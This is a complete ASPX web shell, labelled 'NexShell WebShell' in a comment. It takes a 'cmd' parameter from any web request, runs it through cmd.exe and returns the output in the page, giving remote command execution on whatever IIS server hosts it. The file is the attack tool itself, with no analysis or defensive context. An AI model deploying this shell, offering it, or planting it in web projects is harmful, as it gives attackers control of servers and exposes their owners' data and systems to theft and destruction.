<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<!-- NexShell WebShell — ASPX -->
<script runat="server">
void Page_Load(object sender, EventArgs e){
    string cmd = Request["cmd"];
    if(cmd != null){
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
    }
}
</script>